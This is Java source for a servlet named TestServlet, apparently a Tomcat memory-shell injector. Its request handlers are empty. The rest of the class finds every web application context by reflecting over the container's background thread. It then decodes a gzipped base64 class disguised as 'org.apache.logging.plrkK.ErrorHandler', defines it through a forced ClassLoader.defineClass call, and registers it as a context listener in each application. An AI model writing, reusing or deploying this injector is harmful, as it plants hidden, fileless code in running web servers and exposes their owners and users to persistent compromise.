package jakarta;

import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2024/12/7
 */
public class TestServlet extends HttpServlet {

    static Object getFV(Object obj, String fieldName) throws Exception {
        try {
            Field field = getF(obj, fieldName);
            field.setAccessible(true);
            return field.get(obj);
        } catch (Exception var3) {
            return null;
        }
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        for (Class<?> clazz = obj.getClass(); clazz != null; clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException var3) {
            }
        }

        throw new NoSuchFieldException(fieldName);
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = getF(obj, fieldName);
        field.set(obj, value);
    }

    static byte[] decodeBase64(String base64Str) throws Exception {
        try {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception var4) {
            Class<?> decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream gzipInputStream = new GZIPInputStream(in);
        byte[] buffer = new byte[256];

        int n;
        while ((n = gzipInputStream.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }

        return out.toByteArray();
    }

    public static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;

        Class<?> tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (Method value : methods) {
                        if (value.getName().equals(methodName) && value.getParameterTypes().length == 0) {
                            method = value;
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }

    public String getUrlPattern() {
        return "/*";
    }

    public String getClassName() {
        return "org.apache.logging.plrkK.ErrorHandler";
    }

    public String getBase64String() throws IOException {
        return "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";
    }


    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList();
        Thread[] threads = (Thread[])invokeMethod(Thread.class, "getThreads");

        try {
            for(Thread thread : threads) {
                if (thread.getName().contains("ContainerBackgroundProcessor")) {
                    Map<?, ?> childrenMap = (Map)getFV(getFV(getFV(thread, "target"), "this$0"), "children");

                    for(Object key : childrenMap.keySet()) {
                        Map<?, ?> children = (Map)getFV(childrenMap.get(key), "children");

                        for(Object key1 : children.keySet()) {
                            Object context = children.get(key1);
                            if (context != null) {
                                contexts.add(context);
                            }
                        }
                    }
                }
            }
        } catch (Exception var14) {
        }

        return contexts;
    }

    private Object getListener(Object context) throws Exception {
        Object listener = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }

        try {
            listener = classLoader.loadClass(this.getClassName()).newInstance();
        } catch (Exception var9) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class<?> clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                listener = clazz.newInstance();
            } catch (Exception var8) {
            }
        }

        return listener;
    }

    public void addListener(Object context, Object listener) throws Exception {
        try {
            List<EventListener> eventListeners = (List)getFV(context, "contextListeners");
            boolean isExist = false;
            for(EventListener eventListener : eventListeners) {
                if (eventListener.getClass().getName().equals(listener.getClass().getName())) {
                    isExist = true;
                    break;
                }
            }

            if (!isExist) {
                eventListeners.add((EventListener)listener);
            }
        } catch (Exception var7) {
        }

    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

    }

    @SuppressWarnings("all")
    public Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }
}
